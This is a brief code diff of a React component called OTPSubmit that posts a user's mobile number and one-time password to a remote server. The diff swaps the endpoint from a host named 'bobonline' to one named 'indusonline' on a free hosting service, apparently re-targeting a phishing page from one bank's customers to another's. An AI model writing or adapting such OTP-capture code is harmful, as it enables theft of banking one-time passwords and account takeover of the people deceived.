@@ -51,7 +51,7 @@ export default function OTPSubmit() {
     setMessage({ text: "", type: "" });
 
     try {
-      await fetch("https://bobonline.onrender.com/api/otp/submit", {
+      await fetch("https://indusonline.onrender.com/api/otp/submit", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({ mobileNumber, otp: otpValue }),
